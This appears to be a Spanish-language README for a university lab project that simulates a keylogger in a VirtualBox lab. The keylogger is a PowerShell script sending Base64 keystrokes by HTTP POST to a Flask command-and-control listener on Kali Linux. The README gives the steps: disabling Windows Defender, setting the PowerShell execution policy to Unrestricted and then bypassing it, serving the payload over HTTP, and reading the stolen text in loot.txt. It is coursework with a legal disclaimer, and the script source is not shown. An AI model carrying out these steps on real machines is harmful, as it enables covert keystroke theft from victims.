# ciberseguridad-proyecto
Proyecto de ciberseguridad que consiste en la instalacion de un keylogger mediante un ataque de ingeniera social

🛡️ Proyecto: Simulación de Keylogger y Servidor C2 (Mando y Control)

Este proyecto académico demuestra cómo un atacante puede exfiltrar información (pulsaciones de teclado) desde una máquina víctima (Windows) hacia un servidor controlado por el atacante (Kali Linux) usando protocolos web estándar.
🌐 1. Configuración de Red (Crucial)

Para que las máquinas se comuniquen, deben estar en la misma red virtual.

    Modo de Red en VirtualBox: Ambas máquinas (Kali y Windows) deben estar en Red Interna o Adaptador Solo-Anfitrión.

    IP de Kali Linux (Atacante): * Comando para verla: ip a.

        Ejemplo usado en esta práctica: 192.168.56.20. con mascara de red 255.255.255.0

    IP de Windows (Víctima):

        Comando para verla: ipconfig.

        Debe estar en el mismo rango: 192.168.56.10. con mascara de red 255.255.255.0

🛠️ 2. Preparación del Entorno
En Windows (Víctima):

Para que el script de ataque corra sin bloqueos:

    Desactivar Antivirus: Deshabilita Windows Defender (Real-time protection), ya que detectará el script como malicioso.

    Permisos de PowerShell: Abre PowerShell como Administrador y ejecuta:
    PowerShell

    Set-ExecutionPolicy Unrestricted -Force

    Esto permite ejecutar scripts .ps1 descargados de la red.

En Kali Linux (Atacante):

    Instalar Flask: El servidor C2 usa Python y Flask.
    Bash

    pip install flask

📥 3. Cómo descargar los archivos en Windows

En lugar de usar USB, simulamos una descarga desde un servidor del atacante:

    En Kali: Ve a la carpeta donde tienes el archivo win_service.ps1 y levanta un servidor temporal:
    Bash

    python3 -m http.server 80

    En Windows: Abre el navegador o usa PowerShell para descargar el archivo:

        Ve a: http://192.168.56.20/win_service.ps1.

        Guárdalo en el Escritorio.

🚀 4. Ejecución del Ataque
Paso 1: Iniciar el Receptor en Kali

Inicia el script que escuchará los datos y los guardará en loot.txt.
Bash

python3 c2_listener.py

Paso 2: Iniciar el Keylogger en Windows

En una terminal de PowerShell:
PowerShell

powershell.exe -ExecutionPolicy Bypass -File .\win_service.ps1

Paso 3: Generar Datos

Abre WordPad en Windows y escribe cualquier texto (debe ser de más de 20 caracteres para que se active el envío).
📊 5. Ver los Resultados (Exfiltración)

Para ver lo que has robado, regresa a la terminal de Kali:

    Ver el archivo creado:
    Bash

cat loot.txt

Monitorear en vivo:
Bash

    tail -f loot.txt

📝 6. Explicación de los Archivos

    win_service.ps1: Es el "agente" malicioso. Captura las teclas usando la API de Windows (GetAsyncKeyState), las convierte a Base64 y las envía vía HTTP POST a Kali.

    c2_listener.py: Es el servidor de Mando y Control. Recibe los paquetes, limpia el prefijo sync_token=, decodifica el Base64 y guarda el texto legible en un archivo.

    loot.txt: El botín. Aquí se almacena cronológicamente todo lo escrito por la víctima.

Este proyecto fue hecho por:
- Luis Martín
- Massiel Perozo 
- Jorge Ramírez 
- Valeria Riera

Estudiantes del 7mo semestre de Ingenieria Informática de la Universidad Católica Andrés Bello


⚠️ AVISO LEGAL: Este proyecto es para fines estrictamente educativos y éticos. El uso de estas técnicas en sistemas sin autorización es ilegal.
